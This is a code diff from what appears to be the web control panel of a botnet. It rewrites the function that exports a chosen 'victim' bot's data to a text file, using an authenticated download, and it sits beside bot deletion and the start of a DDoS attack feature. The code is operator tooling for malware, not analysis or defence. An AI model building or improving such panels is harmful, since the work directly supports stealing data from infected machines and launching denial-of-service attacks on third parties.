@@ -374,11 +374,25 @@ async function deleteBot(botId) {
         }
 
         function exportVictimInfo() {
-            const botId = document.getElementById('victimSelect').value;
-            if (!botId) { alert('Select a bot first'); return; }
-            window.open(`/api/bots/${botId}/export`, '_blank');
-        }
-
+    const botId = document.getElementById('victimSelect').value;
+    if (!botId) { alert('Select a bot first'); return; }
+    fetch(`/api/bots/${botId}/export`, { headers: { 'Authorization': `Bearer ${jwtToken}` } })
+        .then(r => {
+            if (!r.ok) throw new Error('Download failed');
+            return r.blob();
+        })
+        .then(blob => {
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victim_${botId.substring(0,12)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+        })
+        .catch(err => alert('Download failed: ' + err.message));
+}
         // DDoS
         async function startAttack() {
             const target = document.getElementById('ddosTarget').value.trim();
